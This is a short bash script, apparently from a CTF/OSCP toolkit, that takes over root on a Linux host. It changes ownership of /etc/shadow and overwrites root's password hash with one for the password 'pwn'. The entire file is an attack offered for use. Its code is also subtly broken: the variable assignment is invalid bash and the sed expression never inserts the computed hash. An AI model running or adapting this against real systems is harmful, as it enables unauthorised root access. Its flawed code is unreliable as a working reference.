#!/bin/bash

# In case we have write privileges to /etc/shadow... useful for CTFs/OSCP
# default pass in the script: "pwn"

$user="www-data"
$pass=`openssl passwd -1 -salt xyz pwn`
chown $user.$user /etc; chown $user.$user /etc/shadow
sed -i -e 's/^root:[^:]\+:/root:$pass:/' /etc/shadow

